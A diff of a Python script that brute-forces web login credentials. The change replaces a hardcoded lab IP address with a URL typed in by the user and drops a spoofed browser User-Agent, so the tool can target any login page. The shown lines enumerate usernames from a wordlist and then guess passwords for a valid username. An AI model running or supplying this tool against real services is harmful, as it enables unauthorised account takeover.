@@ -1,12 +1,14 @@
+#!/bin/python3 
 import requests
 from termcolor import colored
 import time
 
-url = 'http://10.10.199.57/login'
+# Get the URL from user input
+url = input("Enter the login URL: ")
+
 headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',
-    'Referer': 'http://10.10.199.57/login'
+    'Referer': url
 }
 
 usernames = "usernames.txt"
@@ -70,5 +72,3 @@ def brute_force_passwords(username):
 valid_username = brute_force_usernames()
 if valid_username:
     brute_force_passwords(valid_username)
-
-
